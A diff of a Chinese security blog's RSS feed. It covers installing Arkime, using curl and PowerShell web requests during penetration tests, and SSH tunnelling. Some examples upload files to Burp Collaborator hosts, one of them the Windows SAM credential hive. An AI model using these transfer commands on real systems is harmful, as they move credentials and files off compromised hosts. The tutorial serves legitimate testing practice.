@@ -1,4 +1,6 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络安全 on runshell</title><link>https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 15 Jul 2024 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Centos Stream9安装Arkime</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</link><pubDate>Mon, 15 Jul 2024 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</guid><description>&lt;img src="https://runshell.github.io/images/Arkime_Logo.png" alt="Featured image of post Centos Stream9安装Arkime" /&gt;&lt;h2 id="下载包"&gt;下载包
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络安全 on runshell</title><link>https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 15 Jul 2024 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Centos Stream9安装Arkime</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</link><pubDate>Mon, 15 Jul 2024 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</guid><description>&lt;img src="https://runshell.github.io/images/Arkime_Logo.png" alt="Featured image of post Centos Stream9安装Arkime" /&gt;&lt;h2 id="arkime-简介"&gt;Arkime 简介
+&lt;/h2&gt;&lt;p&gt;Arkime 是一个基于 Elasticsearch 的网络分析工具，用于捕获、存储和分析网络流量。它支持实时流量捕获和分析，以及历史流量的搜索和回放。Arkime 可以用于网络安全分析、流量监控和故障排除等场景。&lt;/p&gt;
+&lt;h2 id="下载包"&gt;下载包
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget https://mirror.ghproxy.com/https://github.com/arkime/arkime/releases/download/v4.3.0/arkime-4.3.0-1.el9.x86_64.rpm
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="安装依赖"&gt;安装依赖
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;yum install -y perl-libwww-perl perl-JSON perl-LWP-Protocol-https
@@ -373,20 +375,20 @@ alt="image2"
 loading="lazy"
 alt="image3"
 &gt;&lt;/p&gt;</description></item><item><title>curl详解</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言
-&lt;/h2&gt;&lt;p&gt;在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，其别名之一是curl。所以，简单记录一下curl的用法。&lt;/p&gt;
-&lt;h2 id="0x01-linux中的curl"&gt;0x01 Linux中的curl
-&lt;/h2&gt;&lt;h3 id="1http请求"&gt;1.http请求
+&lt;/h2&gt;&lt;p&gt;在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl 是一个非常厉害的工具，在绝大多数情况下，linux 系统中是存在 curl 的。此外 Windows 系统中，powershell4.0 及其以后的版本中提供了一个 cmlet——&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，其别名之一是 curl。所以，简单介绍一下 curl 的用法。&lt;/p&gt;
+&lt;h2 id="0x01-linux-中的-curl"&gt;0x01 Linux 中的 curl
+&lt;/h2&gt;&lt;h3 id="1http-请求"&gt;1.http 请求
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl &lt;span style="color:#e6db74"&gt;&amp;#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;Referer: https://admin.college.360.cn/user/student/course/1032&amp;#39;&lt;/span&gt;
+&lt;p&gt;curl 命令后面直接跟 url；使用-H 指定请求头，每个-H 指定一条 header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl &lt;span style="color:#e6db74"&gt;&amp;#39;https://files.xx.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;Referer: https://admin.xx.cn/user/student/course/1032&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;普通表单post，使用-d指定请求体内容。&lt;/p&gt;
+&lt;p&gt;普通表单 post，使用-d 指定请求体内容。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -d &lt;span style="color:#e6db74"&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt; http://127.0.0.1:8080/login
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;文件表单post，使用-F指定需要上传的文件。&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;文件表单 post，使用-F 指定需要上传的文件。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://oumchi.burpcollaborator.net -F &lt;span style="color:#e6db74"&gt;&amp;#34;6379.txt=@6379.txt&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 发送出的请求如下：&lt;/span&gt;
@@ -422,7 +424,7 @@ alt="image3"
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://www.example.com -X OPTIONS
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://www.example.com -X TRACE
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2ftp请求"&gt;2.ftp请求
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2ftp-请求"&gt;2.ftp 请求
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -440,7 +442,7 @@ alt="image3"
 &lt;/ul&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl –u name:passwd ftp://www.xxx.com/ -X &lt;span style="color:#e6db74"&gt;&amp;#39;DELE mp3/size.mp3&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="3其他"&gt;3.其他
-&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-ba&amp;#39;sh" data-lang="ba&amp;#39;sh"&gt;-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
+&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-ba'sh" data-lang="ba'sh"&gt;-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
 --ntlm 使用htlm认证
 -A, --user-agent &amp;lt;name&amp;gt; 指定请求头中的user-agent字段
 --socks5 &amp;lt;host[:port]&amp;gt; 使用sockes5代理
@@ -448,8 +450,8 @@ alt="image3"
 --post301 Do not switch to GET after following a 301 不跳转301
 --post302 Do not switch to GET after following a 302 不跳转302
 --post303 Do not switch to GET after following a 303 不跳转303
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="0x02-windows中的curl"&gt;0x02 Windows中的curl
-&lt;/h2&gt;&lt;p&gt;powershell 中的curl是&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，它的另一个别名是wget。它是使用&lt;code&gt;-Headers &amp;lt;IDictionary&amp;gt;&lt;/code&gt;来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过&lt;code&gt;-UserAgent &amp;lt;String&amp;gt;&lt;/code&gt;指定。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="0x02-windows-中的-curl"&gt;0x02 Windows 中的 curl
+&lt;/h2&gt;&lt;p&gt;powershell 中的 curl 是&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，它的另一个别名是 wget。它是使用&lt;code&gt;-Headers &amp;lt;IDictionary&amp;gt;&lt;/code&gt;来指定请求头，powershell5.x 即以前版本可以指定所有请求头，之后的版本 UserAgent 只能通过&lt;code&gt;-UserAgent &amp;lt;String&amp;gt;&lt;/code&gt;指定。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Invoke-WebRequest [-Uri] &amp;lt;Uri&amp;gt; [-Body &amp;lt;Object&amp;gt;] [-Certificate &amp;lt;X509Certificate&amp;gt;] [-CertificateThumbprint &amp;lt;String&amp;gt;] [-ContentType &amp;lt;String&amp;gt;] [-Credential &amp;lt;PSCredential&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ] [-DisableKeepAlive] [-Headers &amp;lt;IDictionary&amp;gt;] [-InFile &amp;lt;String&amp;gt;] [-MaximumRedirection &amp;lt;Int32&amp;gt;] [-Method { &lt;span style="color:#66d9ef"&gt;Default&lt;/span&gt; | Get | Head | Post | Put | Delete | Trace | Options
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; | Merge | Patch}] [-OutFile &amp;lt;String&amp;gt;] [-PassThru] [-Proxy &amp;lt;Uri&amp;gt;] [-ProxyCredential &amp;lt;PSCredential&amp;gt;] [-ProxyUseDefaultCredentials] [-SessionVariable &amp;lt;String&amp;gt;] [-Timeou
@@ -459,23 +461,23 @@ alt="image3"
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给&lt;code&gt;write-host&lt;/code&gt;,如&lt;code&gt;curl ifconfig.me | write-host&lt;/code&gt; 。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style="color:#e6db74"&gt;&amp;#34;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#34;&lt;/span&gt; -Headers @{&lt;span style="color:#e6db74"&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;*/*&amp;#34;&lt;/span&gt;; &lt;span style="color:#e6db74"&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;https://admin.college.360.cn&amp;#34;&lt;/span&gt;} -UserAgent &lt;span style="color:#e6db74"&gt;&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#34;&lt;/span&gt; -OutFile xxx.pdf
+&lt;p&gt;使用-UserAgent 指定 UA，使用-Headers 指定请求头，使用-OutFile 指定输出到文件。若不使用-OutFile，将返回一个 HtmlWebResponseObject 对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量 content 等属性。若只想产看响应体，可用管道符传给&lt;code&gt;write-host&lt;/code&gt;,如&lt;code&gt;curl ifconfig.me | write-host&lt;/code&gt; 。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style="color:#e6db74"&gt;&amp;#34;https://files.xx.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#34;&lt;/span&gt; -Headers @{&lt;span style="color:#e6db74"&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;*/*&amp;#34;&lt;/span&gt;; &lt;span style="color:#e6db74"&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;=&lt;span style="color:#e6db74"&gt;&amp;#34;https://admin.xx.cn&amp;#34;&lt;/span&gt;} -UserAgent &lt;span style="color:#e6db74"&gt;&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#34;&lt;/span&gt; -OutFile xxx.pdf
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。&lt;/p&gt;
+&lt;p&gt;在使用非 get 方法时必须用-Method 指定请求方法；请求体可以用-body 指定一个 string 或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile 指定本地文件。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method post -Body &lt;span style="color:#e6db74"&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;如果服务器支持put方法，可以直接put上传文件&lt;/p&gt;
+&lt;p&gt;如果服务器支持 put 方法，可以直接 put 上传文件&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method put -InFile &lt;span style="color:#960050;background-color:#1e0010"&gt;‪&lt;/span&gt;C:\sam.hive
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2ftp"&gt;2.ftp
 &lt;/h3&gt;&lt;p&gt;似乎只能下载文件&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl ftp&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;//user&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;password@127.0.0.&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;21&lt;/span&gt;/s2-&lt;span style="color:#ae81ff"&gt;057&lt;/span&gt;.py -outFile s2-&lt;span style="color:#ae81ff"&gt;057&lt;/span&gt;.py
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x03-netwebclient"&gt;0x03 net.webclient
-&lt;/h2&gt;&lt;p&gt;在powershell4.0以前没有提供&lt;code&gt;Invoke-WebRequest&lt;/code&gt;,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;在 powershell4.0 以前没有提供&lt;code&gt;Invoke-WebRequest&lt;/code&gt;,这时我们可以使用 Net.WebClient，它是.NET Framework 中的一个类。它的功能更加强大。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#ftp下载&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(New-Object System.Net.WebClient).downloadfile(&lt;span style="color:#e6db74"&gt;&amp;#39;ftp://admin:admin@172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -642,7 +644,9 @@ IsAbstract : False
 IsSpecialName : False
 IsConstructor : False
 CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
-&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>SSH隧道转发</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</guid><description>&lt;img src="https://runshell.github.io/images/1536460373438.png" alt="Featured image of post SSH隧道转发" /&gt;&lt;h2 id="0x00-ssh常用参数说明"&gt;0x00 ssh常用参数说明
+&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>SSH隧道转发</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</guid><description>&lt;img src="https://runshell.github.io/images/1536460373438.png" alt="Featured image of post SSH隧道转发" /&gt;&lt;h2 id="简介"&gt;简介
+&lt;/h2&gt;&lt;p&gt;常见的 ssh 协议不仅仅用于远程管理，还可以进行文件上传下载（scp）,还可以进行端口转发和 socks5 代理。本文介绍利用 ssh 实现本地转发、远程转发以及 socks5 代理的方法。&lt;/p&gt;
+&lt;h2 id="0x00-ssh-常用参数说明"&gt;0x00 ssh 常用参数说明
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-C 压缩传输数据,加快传输速度
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-f 后台对用户名密码进行认证
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-N 仅仅只用来转发,不用再弹回一个新的shell
@@ -657,9 +661,9 @@ CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-p 指定远程ssh服务端口
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x01-本地转发"&gt;0x01 本地转发
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-C&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-f&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-N&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-g&lt;span style="color:#f92672"&gt;]&lt;/span&gt; -L &lt;span style="color:#f92672"&gt;[&lt;/span&gt;本机ip&lt;span style="color:#f92672"&gt;]&lt;/span&gt;:本机端口:vps能访问的主机ip:端口 &amp;lt;user@vps&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将本地的一个端口映射到vps能到达的主机的一个端口。如果vps是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将本地的一个端口映射到 vps 能到达的主机的一个端口。如果 vps 是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;例：假如你拥有一台web服务器的控制权，但是数据库服务器没有公网IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;例：假如你拥有一台 web 服务器的控制权，但是数据库服务器没有公网 IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：&lt;/p&gt;&lt;/blockquote&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -Nnf -L 6666:10.10.10.12:3306 root@188.224.123.45
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#访问本地的6666端口就可以被映射到数据库10.10.10.12的3306端口&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mysql -u root -ppassword -P &lt;span style="color:#ae81ff"&gt;6666&lt;/span&gt;
@@ -670,11 +674,11 @@ alt="1536460373438"
 &gt;&lt;/p&gt;
 &lt;h2 id="0x02-远程转发"&gt;0x02 远程转发
 &lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -C -f -N -R 0.0.0.0:vps_port:本机能访问的IP:端口 root@vps
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将vps上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过vps访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为0.0.0.0，它也仅能监听127.0.0.1，不能实现内网穿透。&lt;/p&gt;
-&lt;p&gt;然后经过一番折腾，得出答案，需要修改sshd的配置文件&lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;,将配置做如下修改：&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将 vps 上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过 vps 访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为 0.0.0.0，它也仅能监听 127.0.0.1，不能实现内网穿透。&lt;/p&gt;
